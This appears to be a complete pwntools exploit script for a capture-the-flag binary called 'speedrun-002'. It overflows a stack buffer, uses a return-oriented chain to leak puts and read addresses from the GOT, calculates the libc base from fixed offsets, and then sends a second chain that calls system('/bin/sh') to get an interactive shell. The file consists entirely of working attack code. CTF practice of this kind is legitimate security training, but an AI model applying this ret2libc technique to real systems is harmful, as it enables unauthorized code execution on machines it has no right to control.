from pwn import *

s = process('./speedrun-002')
raw_input('shut up !')

main_add = 0x00000000004007CE
after_1_read = 0x40077c
offset2ret2 = 0x408
offset2retmain = 0x428
read_plt = 0x4005e0
puts_plt = 0x4005b0
puts_got = 0x601028
read_got = 0x601040
pop_rdi_ret = 0x00000000004008a3 #0
pop_rdx_ret = 0x00000000004006ec #len
pop_rsi_pop_r15_ret = 0x00000000004008a1 #dia chi
string_cmp = 'Everything intelligent is so boring.'
ret_area= 0x601000
s.sendline(string_cmp)

payload = 'a'*offset2ret2
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
# payload += p64(pop_rdi_ret)
# payload += p64(0)
# payload += p64(pop_rdx_ret)
# payload += p64(100)
# payload += p64(pop_rsi_pop_r15_ret)
# payload += p64(ret_area)
# payload += p64(1)
# payload += p64(read_plt)
payload += p64(main_add) #ret2main
s.sendline(payload)

s.recvuntil('Fascinating.\n')
puts_add = u64(s.recv(6)+'\x00\x00')
s.recvuntil('\n')
read_add = u64(s.recv(6)+'\x00\x00')
print 'puts_add = 0x%x' % puts_add
print 'read_add = 0x%x' % read_add

# find the libc version
offset_str_bin_sh = 0x18cd57
offset_system = 0x0000000000045390
offset_read = 0x00000000000f7250
base_add = read_add - offset_read
system_add = base_add + offset_system
bin_sh_add = base_add + offset_str_bin_sh

payload2 = 'a'*offset2ret2
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_add)
payload2 += p64(system_add)

s.sendline(string_cmp)
s.sendline(payload2)

s.interactive()
